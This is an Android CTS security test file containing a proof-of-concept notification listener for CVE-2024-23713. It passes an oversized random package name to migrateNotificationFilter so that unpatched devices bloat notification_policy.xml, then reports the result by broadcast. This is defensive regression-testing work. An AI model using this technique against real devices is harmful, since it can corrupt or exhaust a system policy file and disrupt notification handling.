/*
 * Copyright (C) 2024 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2024_23713;

import android.content.Intent;
import android.security.cts.R;
import android.service.notification.NotificationListenerService;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class PocNotificationListenerService extends NotificationListenerService {

    @Override
    public void onListenerConnected() {
        String exception = null;
        try {
            // Call "migrateNotificationFilter" with large invalid package name. Without fix, it
            // will write the package name in notification_policy.xml causing the length of file to
            // increase.
            List<String> disallowed_packages = new ArrayList<>();
            disallowed_packages.add(
                    new Random()
                            .ints('A' /* randomNumberOrigin */, 'Z' + 1 /* randomNumberBound */)
                            .limit(getResources().getInteger(R.integer.CVE_2024_23713_Limit))
                            .collect(
                                    StringBuilder::new /* supplier */,
                                    StringBuilder::appendCodePoint /* accumulator */,
                                    StringBuilder::append /* combiner */)
                            .toString());
            migrateNotificationFilter(0 /* defaultTypes */, disallowed_packages);
        } catch (Exception e) {
            exception = e.getMessage();
        } finally {
            try {
                Intent intent = new Intent(getString(R.string.CVE_2024_23713_action));
                intent.putExtra(getString(R.string.CVE_2024_23713_exception), exception)
                        .setPackage(getPackageName());
                sendBroadcast(intent);
            } catch (Exception e) {
                // Ignore all exceptions
            }
        }
    }
}
